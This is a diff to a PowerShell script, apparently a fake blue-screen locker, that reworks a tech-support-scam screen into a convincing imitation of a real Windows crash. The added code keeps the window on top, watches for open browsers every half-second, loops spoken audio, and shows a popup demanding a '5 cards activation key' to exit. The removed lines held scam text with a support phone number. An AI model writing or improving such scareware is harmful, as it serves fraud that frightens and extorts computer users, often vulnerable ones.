@@ -44,107 +44,130 @@ PS> Show-BSODDemo
 	$form.TopMost = $true
 	$form.Activate()
 
-	$mainText = "Your PC has been infected with a trojan virus and if you try to restart it can lead to`r`ncorruption of data just call the windows support below."
+	$mainText = "Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart."
+
+	$bsodFace = New-Object System.Windows.Forms.Label
+	$bsodFace.Text = ':('
+	$bsodFace.Font = New-Object System.Drawing.Font('Segoe UI Symbol', 82, [System.Drawing.FontStyle]::Regular)
+	$bsodFace.ForeColor = [System.Drawing.Color]::White
+	$bsodFace.AutoSize = $true
+	$bsodFace.Location = New-Object System.Drawing.Point(120, 40)
+	$bsodFace.BackColor = $form.BackColor
+	$form.Controls.Add($bsodFace)
 
 	$mainMessage = New-Object System.Windows.Forms.Label
 	$mainMessage.AutoSize = $false
-	$mainMessage.Width = 1700
-	$mainMessage.Height = 170
-	$mainMessage.Font = New-Object System.Drawing.Font('Consolas', 29, [System.Drawing.FontStyle]::Regular)
-	$mainMessage.Location = New-Object System.Drawing.Point(35, 20)
+	$mainMessage.Width = 1100
+	$mainMessage.Height = 120
+	$mainMessage.Font = New-Object System.Drawing.Font('Consolas', 25, [System.Drawing.FontStyle]::Regular)
+	$mainMessage.Location = New-Object System.Drawing.Point(120, 170)
 	$mainMessage.Text = $mainText
 	$mainMessage.ForeColor = [System.Drawing.Color]::White
 	$mainMessage.BackColor = $form.BackColor
-	$mainMessage.Padding = New-Object System.Windows.Forms.Padding(0)
 	$form.Controls.Add($mainMessage)
 
 	$progressLabel = New-Object System.Windows.Forms.Label
-	$progressLabel.Text = '0% complete'
+	$progressLabel.Text = '46% complete'
 	$progressLabel.Font = New-Object System.Drawing.Font('Consolas', 18)
 	$progressLabel.ForeColor = [System.Drawing.Color]::White
 	$progressLabel.AutoSize = $true
-	$progressLabel.Location = New-Object System.Drawing.Point(40, 190)
+	$progressLabel.Location = New-Object System.Drawing.Point(120, 300)
 	$form.Controls.Add($progressLabel)
 
-	$divider = New-Object System.Windows.Forms.Label
-	$divider.Width = 2
-	$divider.Height = 290
-	$divider.BackColor = [System.Drawing.Color]::FromArgb(208, 233, 255)
-	$divider.Location = New-Object System.Drawing.Point(420, 170)
-	$form.Controls.Add($divider)
+	$qrBox = New-Object System.Windows.Forms.PictureBox
+	$qrBox.Size = New-Object System.Drawing.Size(140, 140)
+	$qrBox.Location = New-Object System.Drawing.Point(120, 360)
+	$qrBox.BackColor = [System.Drawing.Color]::White
+	$qrBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
+	$qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
+	$form.Controls.Add($qrBox)
 
-	$help = New-Object System.Windows.Forms.Label
-	$help.Text = "Need immediate help?`r`nCall Technical Support:"
-	$help.Font = New-Object System.Drawing.Font('Consolas', 26)
-	$help.ForeColor = [System.Drawing.Color]::White
-	$help.AutoSize = $true
-	$help.Location = New-Object System.Drawing.Point(40, 280)
-	$form.Controls.Add($help)
+	$qrClient = New-Object System.Net.WebClient
+	$qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=140x140&margin=0&data=CRITICAL%20PROCESS%20DIED'
+	try {
+		$qrBytes = $qrClient.DownloadData($qrUrl)
+		$qrStream = New-Object System.IO.MemoryStream($qrBytes, $false)
+		$qrBox.Image = [System.Drawing.Image]::FromStream($qrStream)
+	} catch {
+		$qrBox.BackColor = [System.Drawing.Color]::White
+	}
 
-	$phone = New-Object System.Windows.Forms.Label
-	$phone.Text = '+1 202-683-0876'
-	$phone.Font = New-Object System.Drawing.Font('Consolas', 30, [System.Drawing.FontStyle]::Bold)
-	$phone.ForeColor = [System.Drawing.Color]::FromArgb(255, 216, 70)
-	$phone.AutoSize = $true
-	$phone.Location = New-Object System.Drawing.Point(40, 395)
-	$form.Controls.Add($phone)
+	$qrText = New-Object System.Windows.Forms.Label
+	$qrText.Text = "For more information about this issue and possible fixes, visit our site`r`nIf you call a support person, give them this info:`r`nStop code: CRITICAL_PROCESS_DIED"
+	$qrText.Font = New-Object System.Drawing.Font('Consolas', 18)
+	$qrText.ForeColor = [System.Drawing.Color]::White
+	$qrText.AutoSize = $true
+	$qrText.Location = New-Object System.Drawing.Point(285, 360)
+	$form.Controls.Add($qrText)
 
-	$customerIp = New-Object System.Windows.Forms.Label
-	$customerIp.Text = "Your IP address is locked: $(([System.Net.IPAddress]::Parse('192.0.2.1').GetAddressBytes() | ForEach-Object { $_ + (Get-Random -Maximum 255) }) -join '.')"
-	$customerIp.Font = New-Object System.Drawing.Font('Consolas', 20)
-	$customerIp.ForeColor = [System.Drawing.Color]::White
-	$customerIp.AutoSize = $true
-	$customerIp.Location = New-Object System.Drawing.Point(40, 455)
-	$form.Controls.Add($customerIp)
+	$progressBar = New-Object System.Windows.Forms.Label
+	$progressBar.Width = 2
+	$progressBar.Height = 360
+	$progressBar.BackColor = [System.Drawing.Color]::FromArgb(216, 234, 255)
+	$progressBar.Location = New-Object System.Drawing.Point(420, 160)
+	$form.Controls.Add($progressBar)
 
-	$availability = New-Object System.Windows.Forms.Label
-	$availability.Text = 'Available 24/7 for emergency assistance'
-	$availability.Font = New-Object System.Drawing.Font('Consolas', 21)
-	$availability.ForeColor = [System.Drawing.Color]::White
-	$availability.AutoSize = $true
-	$availability.Location = New-Object System.Drawing.Point(40, 500)
-	$form.Controls.Add($availability)
+	$bottomText = New-Object System.Windows.Forms.Label
+	$bottomText.Text = "If you call a support person, give them this info:"
+	$bottomText.Font = New-Object System.Drawing.Font('Consolas', 18)
+	$bottomText.ForeColor = [System.Drawing.Color]::White
+	$bottomText.AutoSize = $true
+	$bottomText.Location = New-Object System.Drawing.Point(120, 520)
+	$form.Controls.Add($bottomText)
 
 	$playBtn = New-Object System.Windows.Forms.Button
-	$playBtn.Size = New-Object System.Drawing.Size(160, 160)
+	$playBtn.Size = New-Object System.Drawing.Size(0, 0)
+	$playBtn.Visible = $false
 	$playBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
-	$playBtn.FlatAppearance.BorderSize = 0
-	$playBtn.BackColor = [System.Drawing.Color]::FromArgb(40, 98, 170)
-	$playBtn.ForeColor = [System.Drawing.Color]::White
-	$playBtn.Font = New-Object System.Drawing.Font('Segoe UI Symbol', 38)
-	$playBtn.Text = '◉'
-	$playBtn.Location = New-Object System.Drawing.Point(470, 200)
-	$playBtn.Cursor = [System.Windows.Forms.Cursors]::Hand
-	$playBtn.Add_Click({
-		if ($script:tts -ne $null) {
-			$script:tts.SpeakAsyncCancelAll()
-			$script:tts.SpeakAsync($mainText)
-		}
-	})
+	$playBtn.BackColor = $form.BackColor
 	$form.Controls.Add($playBtn)
 
-	$browserHost = New-Object System.Windows.Forms.Panel
-	$browserHost.Location = New-Object System.Drawing.Point(700, 220)
-	$browserHost.Size = New-Object System.Drawing.Size(570, 290)
-	$browserHost.BackColor = [System.Drawing.Color]::FromArgb(238, 238, 238)
-	$browserHost.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
-	$browserHost.ForeColor = [System.Drawing.Color]::Black
-	$browserHost.Visible = $false
-	$form.Controls.Add($browserHost)
-	$browserHost.SendToBack()
+	$script:browserOverride = $false
+	$script:browserOverrideDelay = $false
 
-	$browser = New-Object System.Windows.Forms.WebBrowser
-	$browser.Dock = [System.Windows.Forms.DockStyle]::Fill
-	$browser.ScriptErrorsSuppressed = $true
-	$browser.Navigate('https://example.com')
-	$browserHost.Controls.Add($browser)
+	$browserMonitorTimer = New-Object System.Windows.Forms.Timer
+	$browserMonitorTimer.Interval = 500
+	$browserMonitorTimer.Add_Tick({
+		if ($script:browserOverrideDelay) {
+			$form.TopMost = $true
+			$form.Activate()
+			return
+		}
+
+		$browserNames = @('chrome', 'msedge', 'firefox', 'iexplore', 'opera', 'brave')
+		$browserRunning = $false
+		foreach ($browserName in $browserNames) {
+			try {
+				$proc = Get-Process -Name $browserName -ErrorAction Stop
+				if ($proc) {
+					$browserRunning = $true
+					break
+				}
+			} catch {
+			}
+		}
+
+		if ($browserRunning) {
+			$form.TopMost = $false
+			$popup.SendToBack()
+			$popup.Visible = $true
+			$popup.Refresh()
+		} else {
+			$form.TopMost = $true
+			$popup.BringToFront()
+			$popup.Visible = $true
+		}
+	})
+	$browserMonitorTimer.Start()
 
 	$browserTimer = New-Object System.Windows.Forms.Timer
 	$browserTimer.Interval = 300000
 	$browserTimer.Add_Tick({
+		$script:browserOverrideDelay = $true
 		$popup.Visible = $false
-		$browserHost.Visible = $true
-		$browserHost.BringToFront()
+		$form.TopMost = $true
+		$form.Activate()
+		$form.BringToFront()
 		$browserTimer.Stop()
 	})
 	$browserTimer.Start()
@@ -169,14 +192,14 @@ PS> Show-BSODDemo
 	$popup.Controls.Add($popupTitle)
 
 	$popupText = New-Object System.Windows.Forms.Label
-	$popupText.Text = 'Enter activation key to exit system recovery mode:'
+	$popupText.Text = 'Enter 5 cards activation key to exit system recovery mode:'
 	$popupText.Font = New-Object System.Drawing.Font('Segoe UI', 14)
 	$popupText.ForeColor = [System.Drawing.Color]::FromArgb(36, 36, 36)
 	$popupText.AutoSize = $true
 	$popupText.Location = New-Object System.Drawing.Point(25, 70)
 	$popup.Controls.Add($popupText)
 
-	$validActivationCode = 'KJH4Y-8GTRD-2M7QX-9PLW3-4STN8'
+	$validActivationCode = 'KJH4Y-8GTRD'
 	$validActivationCodeNormalized = ($validActivationCode -replace '[^A-Za-z0-9]', '').ToUpperInvariant()
 	$errorLabel = New-Object System.Windows.Forms.Label
 	$errorLabel.Text = ''
@@ -278,20 +301,50 @@ PS> Show-BSODDemo
 
 	$script:tts = $null
 	$script:ttsEnabled = $false
+	$script:audioFallbackTimer = $null
+
 	try {
-		$script:tts = New-Object System.Speech.Synthesis.SpeechSynthesizer
-		$script:tts.Volume = 100
-		$script:tts.Rate = 0
-		$script:ttsEnabled = $true
-		$script:tts.SpeakCompleted += {
-			if ($script:ttsEnabled -and $script:tts -ne $null) {
-				$script:tts.SpeakAsync($mainText)
+		$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
+		$installedVoices = $synth.GetInstalledVoices()
+
+		if ($installedVoices -and $installedVoices.Count -gt 0) {
+			$firstVoice = $installedVoices[0].VoiceInfo
+			if ($firstVoice -and $firstVoice.Name) {
+				$synth.SelectVoice($firstVoice.Name)
+				$synth.Volume = 100
+				$synth.Rate = 0
+				$script:tts = $synth
+				$script:ttsEnabled = $true
+				$script:tts.SpeakCompleted += {
+					if ($script:ttsEnabled -and $script:tts -ne $null) {
+						$script:tts.SpeakAsync($mainText)
+					}
+				}
+				$script:tts.SpeakAsync($mainText) | Out-Null
 			}
 		}
-		$script:tts.SpeakAsync($mainText) | Out-Null
 	} catch {
 		$script:tts = $null
 		$script:ttsEnabled = $false
+	}
+
+	if (-not $script:ttsEnabled) {
+		try {
+			[System.Media.SystemSounds]::Exclamation.Play()
+			[System.Media.SystemSounds]::Asterisk.Play()
+		} catch {
+		}
+
+		$script:audioFallbackTimer = New-Object System.Windows.Forms.Timer
+		$script:audioFallbackTimer.Interval = 2500
+		$script:audioFallbackTimer.Add_Tick({
+			try {
+				[System.Media.SystemSounds]::Exclamation.Play()
+			} catch {
+			}
+			$script:audioFallbackTimer.Stop()
+		})
+		$script:audioFallbackTimer.Start()
 	}
 
 	$form.Add_KeyDown({
@@ -312,6 +365,7 @@ PS> Show-BSODDemo
 	$form.Add_Shown({
 		$browserHost.Visible = $false
 		$browserHost.SendToBack()
+		$browserHost.TopMost = $false
 		$popup.Visible = $true
 		$popup.BringToFront()
 		if ($keyInput -ne $null) {
